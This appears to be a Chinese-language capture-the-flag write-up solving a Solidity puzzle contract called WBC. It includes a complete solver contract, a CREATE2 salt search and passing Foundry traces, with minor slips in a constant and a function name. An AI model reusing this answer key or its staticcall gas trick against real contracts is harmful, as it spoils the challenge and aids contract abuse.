## WBC

目标是通过设置 scored = true 来得分，可以通过 `homerun()` 或 `_homeBase()` 函数来实现。

**homerun()**
``` solidity
    function homerun() external {
        require(block.timestamp % 23_03_2023 == 0, "try again");
        scored = true;
    }
```
要求区块时间戳必须是 `230322023` 的倍数来得分，不可能通过这种方式，所以需要从 `ready()` 函数来入手，解决 5 个子问题。

**ready()**
``` solidity
    address private immutable judge;

    constructor() {
        judge = block.coinbase;
    }

    function ready() external {
        require(IGame(msg.sender).judge() == judge, "wrong game");
        _swing();
    }
```
需要我们部署一个合约，并且实现 `judge()` 函数来返回一个地址，由于在 WBC 合约中 judge 地址为当前出块地址，所以我们需要在部署 WBC 合约的同一个区块部署我们的合约。

**bodyCheck()**  
``` solidity
    modifier onlyPlayer() {
        require(msg.sender == player, "security!");
        _;
    }

    function bodyCheck() external {
        require(msg.sender.code.length == 0, "no personal stuff");
        require(uint256(uint160(msg.sender)) % 100 == 10, "only valid players");

        player = msg.sender;
    }

    function _swing() internal onlyPlayer {
        _firstBase();
        require(scored, "failed");
    }
```
随后需要执行 `_swing()` 函数，在执行该函数之前需要通过 `bodyCheck()` 函数，成为一个有效的玩家。

调用 `bodyCheck()` 函数需要你的合约代码长度为 0，这点可以通过构造函数中调用 `bodyCheck()` 函数来实现。此外需要满足 `uint256(uint160(msg.sender)) % 100 == 10` 这个条件，那么需要使用 `create2` 来计算 `salt` 值部署合约。

**steal()**  
``` solidity
    function _firstBase() internal {
        uint256 o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o = 1001000030000000900000604030700200019005002000906;
        uint256 o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o = 460501607330902018203080802016083000650930542070;
        uint256 o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o = 256; // 2^8
        uint256 o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o = 1;
        _secondBase(
            uint160(
                o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o
                    + o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o * o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o
                    - o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o
            )
        );
    }

    function _secondBase(uint160 input) internal {
        require(IGame(msg.sender).steal() == input, "out");
        _thirdBase();
    }
```
`_firstBase()` 会调用 `_sendBase()`，传入一个 uint160 类型的数字。随后，`_sendBase()` 会检查这个数字是否与我们的合约中 `steal()` 函数返回的值相等。这个我们直接算就行。

**execute()**  
``` solidity
    function _thirdBase() internal {
        require(keccak256(abi.encodePacked(this.decode(IGame(msg.sender).execute()))) == keccak256("HitAndRun"), "out");
        _homeBase();
    }

    function decode(bytes32 data) external pure returns (string memory) {
        assembly {
            mstore(0x20, 0x20)
            mstore(0x49, data)
            return(0x20, 0x60)
        }
    }
```
需要实现一个 `execute()` 函数，给出一个字符串，通过 `decode()` 解码后得到 "HitAndRun" 字符串本身。

那么我们需要返回的字符串的编码应该是
```
0000000000000000000000000000000000000000000000000000000000000020  // 偏移量
0000000000000000000000000000000000000000000000000000000000000009  // 字符串长度
486974416e6452756e0000000000000000000000000000000000000000000000  // HitAndRun
```

在 `decode()` 函数中，内存[0x20, 0x40) 存入了偏移量 0x20，我们需要在内存[0x40, 0x60) 存入 0x9，而代码中存放 data 的内存位置是 0x49，所以我们需要在[0x49, 0x60) 存放 `00..9`，具体为 0x60 - 0x49 = 0x17(23字节), 那么需要 45 个 0 拼上 9。最后再拼上"HitAndRun"对应的 ASCII 码，得到输入到 `decode` 的 data 为 `bytes32(0x0000000000000000000000000000000000000000000009486974416e6452756e)`

**shout()**  
``` solidity
    function _homeBase() internal {
        scored = true;

        (bool succ, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
        require(succ, "out");
        require(
            keccak256(abi.encodePacked(abi.decode(data, (string)))) == keccak256(abi.encodePacked("I'm the best")),
            "out"
        );

        (succ, data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
        require(succ, "out");
        require(
            keccak256(abi.encodePacked(abi.decode(data, (string))))
                == keccak256(abi.encodePacked("We are the champion!")),
            "out"
        );
    }
```
`_homeBase()` 函数要求我们实现一个 `shout()` 函数，其中两次连续的 `staticcall` 返回不同的字符串。

我们无法通过存储变量来区分第一次和第二次 `staticcall`，由于两次连续 `staticcall` 唯一的区别就是 gas 消耗量，所以通过 `gasleft()` 的变化来做区分。

POC:
``` solidity
contract Ans {
    WBC public immutable wbc;

    uint256 prev_gas;

    constructor(address wbc_) {
        wbc = WBC(wbc_);
        wbc.bodyCheck();
    }

    function win() external {
        wbc.ready();
    }

    function judge() external view returns (address) {
        return block.coinbase;
    }

    function steal() external pure returns (uint160) {
        return 507778882907781185490817896798523593512684789769;
    }

    function execute() external returns (bytes32) {
        prev_gas = gasleft();
        return bytes32(0x0000000000000000000000000000000000000000000009486974416e6452756e);
    }

    function shout() external view returns (bytes memory) {
        //console.log(prev_gas - gasleft());
        if (prev_gas - gasleft() <= 25500) {
            return ("I'm the best");
        } else {
            return ("We are the champion!");
        }
    }
}
```

```
    function testExploit() external {
        uint256 salt = 2;
        ans = new Ans{salt: bytes32(salt)}(address(wbc));
        ans.win();
        base.solve();
        assertTrue(base.isSolved());
    }

    function testSalt() external {
        uint256 salt;

        for (uint256 i = 0; i < 1000; ++i) {
            try new Ans{salt: bytes32(i)}(address(wbc)) returns (Ans) {
                salt = i;
                break;
            } catch {}
        }
        console2.log(salt);
    }
```

```
[PASS] testExploit() (gas: 281835)
Traces:
  [281835] WBCTest::testExploit()
    ├─ [161756] → new Ans@0x658dD904487B0834dCe7f00157B62c7B19243B86
    │   ├─ [22477] WBC::bodyCheck()
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 680 bytes of code
    ├─ [31728] Ans::win()
    │   ├─ [31211] WBC::ready()
    │   │   ├─ [256] Ans::judge() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [301] Ans::steal() [staticcall]
    │   │   │   └─ ← [Return] 507778882907781185490817896798523593512684789769 [5.077e47]
    │   │   ├─ [22383] Ans::execute()
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000009486974416e6452756e
    │   │   ├─ [308] WBC::decode(0x0000000000000000000000000000000000000000000009486974416e6452756e) [staticcall]
    │   │   │   └─ ← [Return] "HitAndRun"
    │   │   ├─ [678] Ans::shout() [staticcall]
    │   │   │   └─ ← [Return] 0x49276d207468652062657374
    │   │   ├─ [679] Ans::shout() [staticcall]
    │   │   │   └─ ← [Return] 0x57652061726520746865206368616d70696f6e21
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [25123] WBCBase::solve()
    │   ├─ [294] WBC::scored() [staticcall]
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [286] WBCBase::isSolved() [staticcall]
    │   └─ ← [Return] true
    └─ ← [Stop] 

[PASS] testSalt() (gas: 271843)
Logs:
  2
```